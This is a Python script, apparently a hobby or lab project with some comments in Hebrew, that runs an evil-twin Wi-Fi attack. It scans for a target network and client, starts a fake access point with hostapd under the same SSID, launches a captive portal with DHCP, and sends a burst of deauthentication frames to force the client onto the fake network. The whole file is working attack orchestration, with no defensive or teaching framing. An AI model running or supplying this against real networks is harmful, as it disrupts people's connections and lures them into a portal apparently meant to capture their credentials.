from find_target import scan_wifi_networks
from dhcp_server import start_captive_portal
from deauthentication_attack import send_deauth_to_client
import subprocess
import threading
import time
import os
import atexit
import signal
import sys

ADAPTER_INTERFACE = "wlp4s0f4u1"
MY_INTERFACE = "wlp2s0"
MONITOR_SCRIPT = "../change_interface_mode/set_monitor.sh"
MANAGED_SCRIPT = "../change_interface_mode/set_managed.sh"
MASTER_SCRIPT = "../change_interface_mode/set_master.sh"
HOSTAPD_SCRIPT = "./start_network.sh"

def wait_for_enter():
    input("⏸️ Press Enter to continue...\n")

def enable_monitor_mode(interface):
    print(f"[*] Enabling monitor mode  on interface {interface} using {MONITOR_SCRIPT}...")
    try:
        subprocess.run([MONITOR_SCRIPT, interface], check=True)
    except subprocess.CalledProcessError:
        print(f"❌ Failed to enable monitor mode on {interface}")
        exit(1)

def enable_managed_mode(interface):
    print(f"[*] Enabling managed mode on interface {interface} using {MANAGED_SCRIPT}...")
    try:
        subprocess.run([MANAGED_SCRIPT, interface], check=True)
    except subprocess.CalledProcessError:
        print(f"❌ Failed to enable managed mode on {interface}")
        exit(1)

def enable_master_mode(interface):
    print(f"[*] Enabling master mode on interface {interface} using {MASTER_SCRIPT}...")
    try:
        subprocess.run([MASTER_SCRIPT, interface], check=True)
    except subprocess.CalledProcessError:
        print(f"❌ Failed to enable master mode on {interface}")
        exit(1)

def start_hostapd(ssid, interface):
    print(f"[*] Running start_hostapd('{ssid}') on interface {interface} from Bash script...")
    try:
        subprocess.run(["bash", "start_network.sh", "run_function", "start_hostapd", interface, ssid], check=True)
    except subprocess.CalledProcessError:
        print("❌ Failed to run start_hostapd from script.")
        exit(1)

HOSTAPD_PID_FILE = "hostapd.pid"  # או הנתיב המלא לקובץ PID אם שונה
HOSTAPD_CONFIG = "hostapd.conf"  # שם קובץ הקונפיגורציה

def cleanup_hostapd():
    print("🧹 Cleaning up hostapd processes...")

    # Kill the known background process
    if os.path.isfile(HOSTAPD_PID_FILE):
        with open(HOSTAPD_PID_FILE, "r") as f:
            pid = f.read().strip()
        print(f"🛑 Killing hostapd process: {pid}")
        subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os.remove(HOSTAPD_PID_FILE)

    # Kill any remaining hostapd processes related to the config file
    try:
        result = subprocess.run(
            f"ps aux | grep {HOSTAPD_CONFIG} | grep -v grep | awk '{{print $2}}'",
            shell=True,
            capture_output=True,
            text=True
        )
        pids = result.stdout.strip().splitlines()
        if pids:
            print(f"🛑 Killing additional hostapd processes: {' '.join(pids)}")
            subprocess.run(["kill", "-9"] + pids)
    except Exception as e:
        print(f"⚠️ Failed to clean up extra processes: {e}")

atexit.register(cleanup_hostapd)
atexit.register(enable_managed_mode, MY_INTERFACE)
atexit.register(enable_managed_mode, ADAPTER_INTERFACE)

# טיפול בסיגנלים Ctrl+C או kill
def handle_signal(sig, frame):
    print(f"\n[!] Caught signal {sig}, cleaning up and exiting...")
    cleanup_hostapd() 
    enable_managed_mode(MY_INTERFACE)
    enable_managed_mode(ADAPTER_INTERFACE)
    sys.exit(0)

signal.signal(signal.SIGINT, handle_signal)   # Ctrl+C
signal.signal(signal.SIGTERM, handle_signal)  # kill


def main():
    # Step 0: Switch to monitor mode
    print("🚀 Step 0: Set monitor mode")
    enable_monitor_mode(ADAPTER_INTERFACE)
    #enable_managed_mode(MY_INTERFACE)

    print("\n🚀 Step 1: Scanning Wi-Fi Networks")
    bssid, ssid, client = scan_wifi_networks(ADAPTER_INTERFACE)

    if not bssid or not ssid or not client:
        print("❌ Failed to select network/client.")
        return
    wait_for_enter()

    # Step 1.5: Switch to master mode
    enable_master_mode(ADAPTER_INTERFACE)
    enable_monitor_mode(MY_INTERFACE)

    print("\n🚀 Step 2: Starting Hostapd (Fake AP)")
    hostapd_thread = threading.Thread(target=start_hostapd, args=(ssid, ADAPTER_INTERFACE,), daemon=True)
    hostapd_thread.start()
    time.sleep(3)
    wait_for_enter()

    print("\n🚀 Step 3: Launching Captive Portal with DHCP")
    captive_portal_thread = threading.Thread(target=start_captive_portal, args=(ADAPTER_INTERFACE,), daemon=True)
    captive_portal_thread.start()
    time.sleep(3)
    wait_for_enter()

    print("\n🚀 Step 4: Sending Deauthentication Attack")
    send_deauth_to_client(interface=MY_INTERFACE, bssid=bssid, target_mac=client, count=100, interval=0.1)

    cleanup_hostapd()
    enable_managed_mode(MY_INTERFACE)
    enable_managed_mode(ADAPTER_INTERFACE)

    time.sleep(5)
    print("\n✅ All steps completed successfully.")

if __name__ == "__main__":
    main()
